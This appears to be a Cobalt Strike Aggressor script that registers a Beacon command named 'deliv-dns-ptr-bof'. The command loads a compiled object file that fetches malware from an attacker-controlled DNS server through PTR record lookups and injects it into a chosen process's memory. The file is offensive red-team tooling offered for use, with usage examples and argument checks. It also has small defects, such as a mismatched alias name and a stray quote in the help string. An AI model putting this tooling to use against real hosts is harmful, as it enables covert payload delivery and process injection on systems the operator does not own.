# author mooolight

beacon_command_register(
	"deliv-dns-ptr-bof", "Deliver malware into the target process' memory block via DNS resolution's PTR record(s).",
	"INFO:\nActions: Deliver malware into the target process' memory block via DNS resolution's PTR record(s).\n\n".
	"ARGUMENTS:\n[<StartIpaddress>]: Specify the first 3 digits of a fake IP address seeding the operation.\n\n"\n[<counter_Number_of_Records>]: This is the number of PTR records to resolve.\n[<FakeDNS_Server>]: specify the IP address of the attacker controlled DNS server \n[<targetProc>]: Specify whether to do fork and run and execute payload remotely or not.\n" .
	"USAGE:\ndeliv-dns-ptr-bof <StartIpaddress> <counter_Number_of_Records> <FakeDNS_Server> <targetProc>\n\n".
	"EXAMPLES:\ndeliv-dns-ptr-bof 12.168.28. 36 192.168.28.3 3268\n\n");
	
alias deliv-dns-ptr {
    $bid = $1;
    $StartIpaddress = $2;
	$counter_Number_of_Records = $3;
    $FakeDNS_Server = $4;
	$targetProc = $5;

    if ($StartIpaddress eq "") {
        berror($bid, "Please specify the fake IP address to seed the DNS malware delivery operation.\n");
        return;
    }
	if ($counter_Number_of_Records eq "") {
        berror($bid, "Please specify the number of PTR records to use in order to download the payload.\n");
        return;
    }
	if ($FakeDNS_Server eq "") {
        berror($bid, "Please specify the attacker-controlled DNS server used to delivery the payload.\n");
        return;
    }
	if ($targetProc eq "") {
        berror($bid, "Please specify the target process to inject the payload delivered (optional by placing the implant's own PID).\n");
        return;
    }
	
    # Read in the right BOF file
    $handle = openf(script_resource("deliv-dns-ptr-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid, "zzzz" ,$StartIpaddress, $counter_Number_of_Records, $FakeDNS_Server, $targetProc);

    blog($bid, "Deliver malware into the target process' memory block via DNS resolution's PTR record(s).");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}





